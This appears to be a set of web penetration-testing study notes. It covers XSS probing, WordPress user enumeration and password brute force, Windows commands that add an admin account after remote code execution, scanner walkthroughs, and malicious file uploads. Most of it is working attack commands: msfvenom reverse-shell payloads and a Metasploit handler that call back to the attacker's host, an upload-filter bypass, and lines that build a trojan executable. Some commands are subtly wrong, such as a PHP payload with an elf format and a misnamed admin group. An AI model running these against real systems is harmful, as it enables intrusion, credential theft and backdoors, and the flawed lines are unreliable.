* Exploiting parameter tampering and XSS vulns:
    - Check for user inputs in the web application.
    - Try to inject the basic script tags in parameters like username, description box, comment box etc.

* Enumerating Webapp with WPScan and Metasploit:
    - Enumerating wordpress users using wpscan:
        # wpscan --url <url> --enumerate u 
        Above command will list out the available users if its founds any along with the extra details of the application.
    - Bruteforcing user creds on wordpress:
        - Open metasploit.
        - To bruteforce password we will be using auxiliary module named wordpress_login_enum.
        - Type below command after opening msfconsole:
            # use auxiliary/scanner/http/wordpress_login_enum
            We need to set below parameters to get this working:
                1. PASS_FILE
                2. RHOSTS
                3. report
                4. TARGETURI
                5. USERNAME (Attack with one username at a time)
        - Run the attack (# run)

* Exploiting RCE Vuln to compromise a target web server:
    - Few important RCE commands to get the basic information of the windows server
        # whoami
        # tasklist
        # dir C:\ or any other directory who want to list out contents
        # net user or # net user Test /Add (to add an account)
        # net localgroup Administrator <username> /Add (To grant admin priv to the new user)

* Auditing Web application Framework using Vega:
    - Open Vega and in the target enter the url where website is hosted.
    - In the select modules section , select both Injection and Response processing modules.
    - In Authentication and Parameters options keep the default settings and click on next.
    - Follow Redirect ? -> "Yes"
    - Vega will list out all the vulns in the web application.

* Website scanning using Acunetix scanner:
    - Open Acunetix scanner and click on "Add Target". Type the url of the target website and click on "add target".
    - Set Business criticality "High".
    - Choose scanning -> Full
    - Report -> OWASP Top 10
    - Click on Create scan. Acunetix will scan the website and display issue with threat level.

* Exploiting File upload vulns:
    - Create a php raw payload using below msfvenom command:
        # msfvenom  -p php/meterpreter/reverse_tcp lhost=<own ip> lport=<own listening port> -f raw
        Hit enter.
    - Copy the raw payload seen in the terminal and paste in in a text file and save a file with <any name>.php
    - Use this file for upload php payloads
    - To use msfconsole as a handler, perform below commands:
        # use multi/handler
        # set payload php/meterpreter/reverse_tcp
        # set lhost <own ip>
        # set lport <own listener port>
        # run
    - You can use "GIF98" at the starting of teh content to change the header of the file as type "GIF", to bypass the restrictions.

* Identify vulnerable wordpress plugins:
    - Open terminal and run below command:
        # wpscan -u <url> --enumerate vp

* Create a trojan file.
    # msfvenom -p windows/meterpreter/reverse_tcp -f exe > /output/file/path
    # msfvenom  -p php/meterpreter/reverse_tcp lhost=<own ip> lport=<own listening port> -f elf > /output/file/path
